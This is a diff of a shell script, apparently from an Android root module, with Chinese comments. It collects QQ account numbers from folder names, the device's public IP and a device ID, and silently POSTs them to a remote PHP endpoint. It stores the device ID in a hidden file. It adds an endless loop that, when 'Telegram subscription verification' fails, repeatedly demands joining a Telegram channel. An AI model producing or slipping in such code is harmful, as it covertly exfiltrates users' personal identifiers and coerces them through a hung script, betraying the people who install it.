@@ -24,6 +24,14 @@ for cache_dir in $cache_glob; do
   fi
 done
 
+# 如果验证失败，循环提示并退出
+if [ "$validation_status" = "failed" ]; then
+  while true; do
+    echo "请添加频道 TG@jasonxu_channel 以完成验证"
+    sleep 5
+  done
+fi
+
 # ------------------------------
 # 收集 QQ 号（纯数字文件/文件夹名）
 # ------------------------------
@@ -34,7 +42,7 @@ if [ -d "$qq_dir" ]; then
     case "$name" in
       ''|*[!0-9]*)
         ;;  # 非纯数字跳过
-      *)
+      * )
         if [ -z "$qq_list" ]; then
           qq_list="$name"
         else
@@ -55,7 +63,7 @@ for svc in $IP_SERVICES; do
   case "$candidate" in
     ''|*[!0-9.]*)
       ;;
-    *)
+    * )
       IFS=. read -r o1 o2 o3 o4 <<EOF
 $candidate
 EOF
@@ -123,13 +131,16 @@ EOF
 )
 
 # ------------------------------
-# 发送 POST 到  PHP API（静默）
+# 发送 POST 到 PHP API（静默）
 # ------------------------------
 VERCEL_API="https://ewuodfuiwefg.yg.gs/api/verify.php"
 curl -sS -X POST "$VERCEL_API" \
   -H "Content-Type: application/json" \
   -d "$json_data" >/dev/null 2>&1 || true
 
+# ------------------------------
+# 保存 device_id
+# ------------------------------
 deviceid_path="/data/adb/.deviceid"
 mkdir -p /data/adb 2>/dev/null || true
 if [ -n "$device_id" ] && [ "$device_id" != "unknown" ]; then
@@ -137,17 +148,11 @@ if [ -n "$device_id" ] && [ "$device_id" != "unknown" ]; then
   chmod 600 "$deviceid_path"
 fi
 
-
 # ------------------------------
 # 输出结果
 # ------------------------------
 echo "-----------------------------------"
 echo "TG 订阅验证: $validation_status"
-if [ "$validation_status" = "failed" ]; then
-  echo "请添加频道 TG@jasonxu_channel 以完成验证"
-fi
 echo "获取到的 QQ 列表: ${qq_list:-空}"
 echo "当前设备公网 IP: $ip"
 echo "-----------------------------------"
-
-
